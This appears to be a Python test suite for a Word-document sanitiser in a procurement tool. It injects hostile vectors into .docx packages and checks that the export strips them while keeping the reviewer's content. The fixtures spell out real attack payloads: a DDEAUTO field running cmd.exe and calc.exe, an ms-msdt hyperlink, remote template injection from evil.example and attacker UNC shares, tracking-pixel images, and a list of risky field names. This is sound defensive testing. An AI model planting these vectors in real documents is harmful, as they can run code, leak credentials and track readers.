# ruff: noqa: E501
"""The annotated copy of a Word file must not carry what the upload used to reach out or to run.

Each vector is injected into a real python-docx package (the way a hostile file would carry it),
the file is run through ``annotate_docx`` as an export is, and the output package is inspected
directly: no external relationship but an ordinary link, no embedded object, no risky field, no
setting that fetches a template - and the reviewer's text, comments, pictures and links intact.
"""

from __future__ import annotations

import io
import re
import zipfile
from collections.abc import Callable
from pathlib import Path

import pytest
from docx import Document
from lxml import etree  # type: ignore[import-untyped]
from PIL import Image

from procurement_agent.report.docx_annotate import annotate_docx
from procurement_agent.report.docx_sanitize import neutralise_package

R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
NS = (
    'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
    f'xmlns:r="{R}" '
    'xmlns:v="urn:schemas-microsoft-com:vml" '
    'xmlns:o="urn:schemas-microsoft-com:office:office" '
    'xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" '
    'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
    'xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"'
)


def _png() -> bytes:
    out = io.BytesIO()
    Image.new("RGB", (4, 4), "red").save(out, format="PNG")
    return out.getvalue()


def _base(tmp_path: Path) -> Path:
    """A clean document: text, a comment, an embedded picture."""
    path = tmp_path / "base.docx"
    doc = Document()
    para = doc.add_paragraph("Contract text before. ")
    doc.add_comment(para.runs[0], text="an existing note", author="Reviewer", initials="R")
    doc.add_paragraph("Contract text after.")
    pic = tmp_path / "pic.png"
    pic.write_bytes(_png())
    doc.add_picture(str(pic))
    doc.save(path)
    return path


# --- hostile vectors: (extra body XML, extra document rels, settings XML, settings rels, extra parts)

Vector = tuple[str, str, str, str, dict[str, bytes]]


def _rel(rid: str, tail: str, target: str, external: bool = False) -> str:
    mode = ' TargetMode="External"' if external else ""
    return f'<Relationship Id="{rid}" Type="{R}/{tail}" Target="{target}"{mode}/>'


def _field(instr: str, shown: str) -> str:
    return (
        f'<w:p {NS}><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        f'<w:r><w:instrText xml:space="preserve"> {instr} </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        f"<w:r><w:t>{shown}</w:t></w:r>"
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )


VECTORS: dict[str, Vector] = {
    "external_image": (
        f"<w:p {NS}><w:r><w:drawing><wp:inline><a:graphic><a:graphicData>"
        '<pic:pic><pic:blipFill><a:blip r:link="rIdX1"/></pic:blipFill></pic:pic>'
        "</a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>",
        _rel("rIdX1", "image", "http://tracker.example/pixel.png", True),
        "",
        "",
        {},
    ),
    "attached_template": (
        "",
        "",
        '<w:attachedTemplate r:id="rIdT1"/>',
        _rel("rIdT1", "attachedTemplate", "http://evil.example/t.dotm", True),
        {},
    ),
    "attached_template_unc": (
        "",
        "",
        '<w:attachedTemplate r:id="rIdT1"/>',
        _rel("rIdT1", "attachedTemplate", "file://attacker/share/t.dotm", True),
        {},
    ),
    "include_picture_field": (
        _field('INCLUDEPICTURE "http://tracker.example/p.png" \\d', "cached picture text"),
        "",
        "",
        "",
        {},
    ),
    "include_text_field": (
        _field('includetext "\\\\\\\\attacker\\\\share\\\\x.docx"', "cached include text"),
        "",
        "",
        "",
        {},
    ),
    "link_field": (
        _field(
            'LINK Excel.Sheet.12 "\\\\\\\\attacker\\\\x.xlsx" "Sheet1!R1C1"', "cached link text"
        ),
        "",
        "",
        "",
        {},
    ),
    "dde_field": (
        _field('DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"', "cached dde text"),
        "",
        "",
        "",
        {},
    ),
    "macrobutton_field": (
        _field("MACROBUTTON AutoOpen click here", "cached macro text"),
        "",
        "",
        "",
        {},
    ),
    "simple_include_field": (
        f'<w:p {NS}><w:fldSimple w:instr=" INCLUDETEXT &quot;x.docx&quot; "><w:r><w:t>simple cached</w:t></w:r></w:fldSimple></w:p>',
        "",
        "",
        "",
        {},
    ),
    "ole_object": (
        f'<w:p {NS}><w:r><w:object><v:shape><v:imagedata r:id="rIdO2"/></v:shape>'
        '<o:OLEObject Type="Embed" ProgID="Package" r:id="rIdO1"/></w:object></w:r></w:p>',
        _rel("rIdO1", "oleObject", "embeddings/oleObject1.bin")
        + _rel("rIdO2", "image", "media/preview.png"),
        "",
        "",
        {
            "word/embeddings/oleObject1.bin": b"MZ\x90\x00 not really an executable",
            "word/media/preview.png": _png(),
        },
    ),
    "embedded_package": (
        f'<w:p {NS}><w:r><w:object><o:OLEObject Type="Embed" ProgID="Excel.Sheet.12" r:id="rIdP1"/></w:object></w:r></w:p>',
        _rel("rIdP1", "package", "embeddings/sheet1.xlsx"),
        "",
        "",
        {"word/embeddings/sheet1.xlsx": b"PK\x03\x04 pretend workbook"},
    ),
    "alt_chunk": (
        f'<w:p {NS}><w:altChunk r:id="rIdC1"/></w:p>',
        _rel("rIdC1", "aFChunk", "afchunk.html"),
        "",
        "",
        {"word/afchunk.html": b"<html><body>merged foreign content</body></html>"},
    ),
    "activex_control": (
        f'<w:p {NS}><w:r><w:object><w:control w:name="Ctl1" r:id="rIdA1"/></w:object></w:r></w:p>',
        _rel("rIdA1", "control", "activeX/activeX1.xml"),
        "",
        "",
        {
            "word/activeX/activeX1.xml": b'<ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX"/>'
        },
    ),
    "vml_control": (
        f'<w:p {NS}><w:r><w:pict><w:control w:name="Ctl2" r:id="rIdA2"/></w:pict></w:r></w:p>',
        _rel("rIdA2", "control", "activeX/activeX2.xml"),
        "",
        "",
        {
            "word/activeX/activeX2.xml": b'<ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX"/>'
        },
    ),
    "update_fields": ("", "", '<w:updateFields w:val="true"/>', "", {}),
    "mail_merge": (
        "",
        "",
        '<w:mailMerge><w:mainDocumentType w:val="formLetters"/><w:dataSource r:id="rIdM1"/></w:mailMerge>',
        _rel("rIdM1", "mailMergeSource", "file:///c:/secret.xls", True),
        {},
    ),
    "unc_hyperlink": (
        f'<w:p {NS}><w:hyperlink r:id="rIdH1"><w:r><w:t>unc link text</w:t></w:r></w:hyperlink></w:p>',
        _rel("rIdH1", "hyperlink", "file://attacker/share/x.docx", True),
        "",
        "",
        {},
    ),
    "diagnostic_scheme_hyperlink": (
        f'<w:p {NS}><w:hyperlink r:id="rIdH2"><w:r><w:t>msdt link text</w:t></w:r></w:hyperlink></w:p>',
        _rel("rIdH2", "hyperlink", "ms-msdt:/id PCWDiagnostic /skip force /param x", True),
        "",
        "",
        {},
    ),
    "windows_path_hyperlink": (
        f'<w:p {NS}><w:hyperlink r:id="rIdH3"><w:r><w:t>path link text</w:t></w:r></w:hyperlink></w:p>',
        _rel("rIdH3", "hyperlink", "C:\\\\Windows\\\\System32\\\\calc.exe", True),
        "",
        "",
        {},
    ),
}

BENIGN = (
    f'<w:p {NS}><w:hyperlink r:id="rIdW1"><w:r><w:t>a web link</w:t></w:r></w:hyperlink></w:p>'
    f'<w:p {NS}><w:hyperlink r:id="rIdW2"><w:r><w:t>a mail link</w:t></w:r></w:hyperlink></w:p>'
    f"<w:p {NS}><w:r><w:t>ordinary closing text</w:t></w:r></w:p>",
    _rel("rIdW1", "hyperlink", "https://example.com/page", True)
    + _rel("rIdW2", "hyperlink", "mailto:buyer@example.com", True),
)


def _rewrite(src: Path, dst: Path, edits: Callable[[dict[str, bytes]], None]) -> Path:
    with zipfile.ZipFile(src) as z:
        members = {n: z.read(n) for n in z.namelist()}
    edits(members)
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in members.items():
            z.writestr(name, data)
    return dst


def _hostile(tmp_path: Path, names: list[str], *, benign: bool = True) -> Path:
    vectors = [VECTORS[n] for n in names]

    def edit(m: dict[str, bytes]) -> None:
        doc = m["word/document.xml"].decode()
        rels = m["word/_rels/document.xml.rels"].decode()
        settings = m["word/settings.xml"].decode()
        settings_rels = ""
        body = "".join(v[0] for v in vectors) + (BENIGN[0] if benign else "")
        rels_extra = "".join(v[1] for v in vectors) + (BENIGN[1] if benign else "")
        for v in vectors:
            settings = (
                settings.replace("</w:settings>", f"{v[2]}</w:settings>") if v[2] else settings
            )
            settings_rels += v[3]
            for part, data in v[4].items():
                m[part] = data
        at = doc.rindex("<w:sectPr")
        m["word/document.xml"] = (doc[:at] + body + doc[at:]).encode()
        m["word/_rels/document.xml.rels"] = rels.replace(
            "</Relationships>", rels_extra + "</Relationships>"
        ).encode()
        m["word/settings.xml"] = settings.encode()
        if settings_rels:
            head = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            m["word/_rels/settings.xml.rels"] = (head + settings_rels + "</Relationships>").encode()
        types = m["[Content_Types].xml"].decode()
        extra = ""
        for ext, ctype in (
            ("bin", "application/vnd.openxmlformats-officedocument.oleObject"),
            ("html", "text/html"),
        ):
            if f'Extension="{ext}"' not in types and any(n.endswith(f".{ext}") for n in m):
                extra += f'<Default Extension="{ext}" ContentType="{ctype}"/>'
        for n in m:
            if n.startswith("word/activeX/") and n.endswith(".xml"):
                extra += f'<Override PartName="/{n}" ContentType="application/vnd.ms-office.activeX+xml"/>'
            if n.endswith(".xlsx") and 'Extension="xlsx"' not in types:
                extra += '<Default Extension="xlsx" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"/>'
        m["[Content_Types].xml"] = types.replace("</Types>", extra + "</Types>").encode()

    return _rewrite(_base(tmp_path), tmp_path / "hostile.docx", edit)


# --- inspecting a package ------------------------------------------------------------------------


def _members(path: Path) -> dict[str, bytes]:
    with zipfile.ZipFile(path) as z:
        return {n: z.read(n) for n in z.namelist()}


def _relationships(members: dict[str, bytes]) -> list[tuple[str, str, str, bool]]:
    out: list[tuple[str, str, str, bool]] = []
    for name, data in members.items():
        if name.endswith(".rels"):
            for rel in etree.fromstring(data):
                out.append(
                    (
                        name,
                        rel.get("Type", "").rsplit("/", 1)[-1],
                        rel.get("Target", ""),
                        rel.get("TargetMode") == "External",
                    )
                )
    return out


def _export(src: Path, tmp_path: Path) -> Path:
    out = tmp_path / "out.docx"
    annotate_docx(src, [], out)
    return out


def _assert_clean(members: dict[str, bytes]) -> None:
    for name, tail, target, external in _relationships(members):
        if external:
            assert tail == "hyperlink", (name, tail, target)
            assert target.startswith(("https://", "http://", "mailto:")), (name, target)
        assert tail not in {
            "oleObject",
            "package",
            "control",
            "aFChunk",
            "attachedTemplate",
            "mailMergeSource",
            "subDocument",
            "frame",
        }, (name, tail)
    names = list(members)
    assert not [
        n for n in names if n.startswith(("word/embeddings/", "word/activeX/", "word/afchunk"))
    ], names
    xml = {n: d.decode("utf-8", "replace") for n, d in members.items() if n.endswith(".xml")}
    document, settings = xml["word/document.xml"], xml["word/settings.xml"]
    for instruction in _instructions(members["word/document.xml"]):
        assert instruction.split(None, 1)[0].upper() not in RISKY, instruction
    for tag in (
        "w:object",
        "w:control",
        "w:altChunk",
        "o:OLEObject",
        "w:subDoc",
        "r:link=",
        "r:href=",
    ):
        assert tag not in document, tag
    for tag in ("attachedTemplate", "mailMerge", "updateFields"):
        assert tag not in settings, tag
    # no part refers to a relationship it no longer has
    for name, text in xml.items():
        folder, _, leaf = name.rpartition("/")
        rels_name = f"{folder}/_rels/{leaf}.rels" if folder else f"_rels/{leaf}.rels"
        known = (
            set(re.findall(r'Id="([^"]+)"', members[rels_name].decode()))
            if rels_name in members
            else set()
        )
        used = set(re.findall(r'\br:(?:id|embed|link|href|pict)="([^"]+)"', text))
        assert used <= known, (name, used - known)


RISKY = {"INCLUDEPICTURE", "INCLUDETEXT", "INCLUDE", "LINK", "DDE", "DDEAUTO", "MACROBUTTON"}


def _instructions(document_xml: bytes) -> list[str]:
    """The text of every field instruction in the part: complex (instrText) and simple (instr)."""
    root = etree.fromstring(document_xml)
    w = "{http://schemas.openxmlformats.org/wordprocessingml/2006/main}"
    found = ["".join(t.text or "" for t in root.iter(f"{w}instrText"))]
    found += [e.get(f"{w}instr", "") for e in root.iter(f"{w}fldSimple")]
    found += [(t.text or "").strip() for t in root.iter(f"{w}instrText")]
    return [f.strip() for f in found if f.strip()]


# --- the tests -----------------------------------------------------------------------------------


@pytest.mark.parametrize("vector", sorted(VECTORS))
def test_each_vector_is_removed_and_the_reviewers_view_is_unchanged(
    vector: str, tmp_path: Path
) -> None:
    hostile = _hostile(tmp_path, [vector])
    before = Document(str(hostile))
    # the vector really is in the file we start from (the test would otherwise prove nothing)
    assert not _is_clean(_members(hostile)), f"{vector} was not injected"
    out = _export(hostile, tmp_path)
    members = _members(out)
    _assert_clean(members)
    after = Document(str(out))  # still a valid Word package
    texts = [p.text for p in after.paragraphs]
    if vector == "simple_include_field":
        # python-docx does not read the runs inside a <w:fldSimple>; unwrapped, the text it last
        # showed is part of the paragraph, like a complex field's result
        assert "simple cached" in "\n".join(texts)
        hidden = ["" if t == "simple cached" else t for t in texts]
        assert hidden == [p.text for p in before.paragraphs]
    else:
        assert texts == [p.text for p in before.paragraphs]
    assert "a web link" in "\n".join(p.text for p in after.paragraphs)


def _is_clean(members: dict[str, bytes]) -> bool:
    try:
        _assert_clean(members)
    except AssertionError:
        return False
    return True


def test_every_vector_at_once(tmp_path: Path) -> None:
    hostile = _hostile(tmp_path, sorted(VECTORS))
    out = _export(hostile, tmp_path)
    _assert_clean(_members(out))
    text = "\n".join(p.text for p in Document(str(out)).paragraphs)
    for kept in (
        "cached picture text",
        "cached include text",
        "cached link text",
        "cached dde text",
        "cached macro text",
        "simple cached",
        "unc link text",
        "msdt link text",
        "path link text",
    ):
        assert kept in text, kept  # a removed field leaves the text it last showed


def test_ordinary_content_survives(tmp_path: Path) -> None:
    hostile = _hostile(tmp_path, ["external_image", "dde_field"])
    out = _export(hostile, tmp_path)
    members = _members(out)
    text = "\n".join(p.text for p in Document(str(out)).paragraphs)
    for kept in (
        "Contract text before.",
        "Contract text after.",
        "ordinary closing text",
        "a web link",
        "a mail link",
    ):
        assert kept in text
    links = {t for _, tail, t, ext in _relationships(members) if tail == "hyperlink" and ext}
    assert links == {"https://example.com/page", "mailto:buyer@example.com"}
    assert any(n.startswith("word/media/") for n in members), "the embedded picture was dropped"
    assert b"an existing note" in members["word/comments.xml"], "an existing comment was dropped"


def test_a_clean_document_is_reported_clean_and_otherwise_untouched(tmp_path: Path) -> None:
    clean = _hostile(tmp_path, [])
    doc = Document(str(clean))
    removed = neutralise_package(doc)
    assert removed.total == 0
    assert removed.kinds == []
    out = tmp_path / "again.docx"
    doc.save(str(out))
    assert [p.text for p in Document(str(out)).paragraphs] == [
        p.text for p in Document(str(clean)).paragraphs
    ]


def test_the_counts_say_what_was_removed(tmp_path: Path) -> None:
    doc = Document(
        str(_hostile(tmp_path, ["external_image", "dde_field", "update_fields", "alt_chunk"]))
    )
    removed = neutralise_package(doc)
    assert removed.relationships >= 2  # the external image and the altChunk part
    assert removed.fields == 1
    assert removed.settings == 1
    assert removed.elements >= 1
    assert set(removed.kinds) >= {"relationships", "fields", "settings", "elements"}


def test_a_field_nested_in_another_is_found(tmp_path: Path) -> None:
    nested = (
        f'<w:p {NS}><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> QUOTE "</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DDE calc.exe </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>inner shown</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:instrText>" </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>outer shown</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
    )
    VECTORS["_nested"] = (nested, "", "", "", {})
    try:
        out = _export(_hostile(tmp_path, ["_nested"]), tmp_path)
    finally:
        del VECTORS["_nested"]
    document = _members(out)["word/document.xml"].decode()
    assert "DDE" not in document
    assert "QUOTE" in document  # the harmless outer field is not touched
    assert "inner shown" in document
    assert "outer shown" in document


def test_a_non_risky_field_is_left_alone(tmp_path: Path) -> None:
    VECTORS["_page"] = (_field("PAGE \\* MERGEFORMAT", "7"), "", "", "", {})
    try:
        out = _export(_hostile(tmp_path, ["_page"]), tmp_path)
    finally:
        del VECTORS["_page"]
    assert "PAGE" in _members(out)["word/document.xml"].decode()
